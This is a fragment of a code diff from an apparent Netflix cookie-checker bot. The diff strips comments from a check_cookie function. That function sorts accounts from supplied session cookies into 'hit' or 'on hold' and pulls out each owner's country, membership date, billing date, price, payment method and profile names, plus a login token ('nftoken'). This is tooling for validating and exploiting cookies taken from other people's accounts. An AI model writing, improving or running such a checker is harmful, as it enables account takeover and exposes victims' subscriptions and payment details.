             country = userinfo.get("countryOfSignup") or userinfo.get("memberCountry")
@@ -1360,7 +1290,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                     break
         result["country"] = country or file_meta.get("country") or "Unknown"
 
-        # ── Member since ──────────────────────────────────────────────────────
         member_since = None
         if userinfo:
             raw = userinfo.get("memberSince") or userinfo.get("joinDate") or userinfo.get("startDate")
@@ -1376,7 +1305,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                         break
         result["member_since"] = member_since or file_meta.get("member_since") or "Unknown"
 
-        # ── Next billing ──────────────────────────────────────────────────────
         next_billing = (plan_info.get("next_billing")
                         or _extract_billing_date_from_html(account_html)
                         or _extract_billing_date_from_html(browse_html)
@@ -1385,14 +1313,12 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
             next_billing = next_billing or "N/A (cancelled)"
         result["next_billing"] = next_billing or "Unknown"
 
-        # ── Price ─────────────────────────────────────────────────────────────
         price_raw = (plan_info.get("price")
                      or _extract_price_from_html(account_html)
                      or _extract_price_from_html(browse_html)
                      or file_meta.get("price") or "")
         result["price"] = _clean_price(price_raw) if price_raw else "Unknown"
 
-        # ── Payment ───────────────────────────────────────────────────────────
         pay_info = _extract_payment_info(account_html) or _extract_payment_info(browse_html)
         payment  = pay_info.get("payment") or ""
         if not payment:
@@ -1411,22 +1337,17 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
         result["is_third_party"]= pay_info.get("is_third_party", False)
         result["partner_name"] = pay_info.get("partner_name") or ""
 
-        # ── Profiles ──────────────────────────────────────────────────────────
-        # Prefer browse page (has full profile list); fall back to account page
         pnames, pcount = _extract_profiles_list(browse_html or account_html)
         if not pnames or pcount == 0:
             pnames, pcount = _extract_profiles_list(account_html)
         result["profile_names"]  = pnames
-        result["profile_count"]  = pcount   # accurate count from __ref array
+        result["profile_count"]  = pcount
         result["profiles"]       = pcount if pcount > 0 else ("Unknown" if not pnames else len(pnames))
 
-        # ── On-hold final check ───────────────────────────────────────────────
         if result["status"] == "hit" and (result["is_on_hold"] or
                 "on hold" in account_html.lower() or "payment hold" in account_html.lower()):
             result["status"] = "on_hold"
 
-        # ── Final sync: on_hold status MUST always have at least one issue ────
-        # Ensures the basic mode ⚠️ section always shows why the account is held
         if result["status"] == "on_hold" and not result.get("account_issues"):
             _ms = result.get("membership_status", "")
             _sync_issue_map = {
@@ -1443,7 +1364,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                 _sync_msg = "Account on hold — payment issue detected"
             result["account_issues"] = [_sync_msg]
 
-        # ── NFToken (already fetched in parallel) ─────────────────────────────
         result["nftoken"] = nft_result
 
         return result
@@ -1453,11 +1373,8 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
     except requests.exceptions.ConnectionError:
         return {"status": "error", "message": "Connection error. Check internet connectivity."}
     except Exception as e:
-        # Also catches curl_cffi.requests.errors.RequestsError and any other
-        # network-layer exception so the bot never crashes on a bad account.
         err_name = type(e).__name__
         err_msg = str(e)
-        # Classify common curl_cffi / network errors for cleaner messages
         if "timed out" in err_msg.lower() or "timeout" in err_msg.lower() or err_name in ("TimeoutError", "ConnectTimeoutError"):
             return {"status": "error", "message": "Request timed out (curl). Netflix may be rate-limiting."}
         if "connection" in err_msg.lower() or err_name in ("ConnectionError", "ConnectError"):
